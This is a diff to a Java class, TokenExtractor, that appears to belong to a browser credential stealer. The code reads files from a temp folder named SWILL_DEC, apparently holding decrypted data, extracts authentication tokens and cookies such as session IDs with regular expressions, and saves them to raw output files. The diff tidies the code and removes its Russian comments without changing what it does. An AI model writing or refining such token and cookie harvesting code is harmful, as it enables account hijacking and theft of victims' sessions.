@@ -1,7 +1,6 @@
 import java.io.*;
 import java.nio.file.*;
 import java.util.regex.*;
-import java.util.*;
 
 public class TokenExtractor {
     private static final String DEC_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
@@ -25,23 +24,16 @@ public class TokenExtractor {
             try {
                 String content = new String(Files.readAllBytes(f.toPath()));
                 
-                // Ищем токены
                 Pattern p = Pattern.compile(TOKEN_PATTERN);
                 Matcher m = p.matcher(content);
-                while (m.find()) {
-                    tokens.append(m.group()).append("\n");
-                }
+                while (m.find()) tokens.append(m.group()).append("\n");
                 
-                // Ищем куки (session_id, __Secure, etc)
                 Pattern cookieP = Pattern.compile("([\\w_]+)=([^;\\n]+)");
                 Matcher cookieM = cookieP.matcher(content);
-                while (cookieM.find()) {
-                    cookies.append(cookieM.group(1)).append("=").append(cookieM.group(2)).append("\n");
-                }
+                while (cookieM.find()) cookies.append(cookieM.group(1)).append("=").append(cookieM.group(2)).append("\n");
             } catch (Exception e) {}
         }
         
-        // Сохраняем результат
         try {
             Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), tokens.toString().getBytes());
             Files.write(Paths.get(OUTPUT_DIR + "\\cookies_raw.txt"), cookies.toString().getBytes());
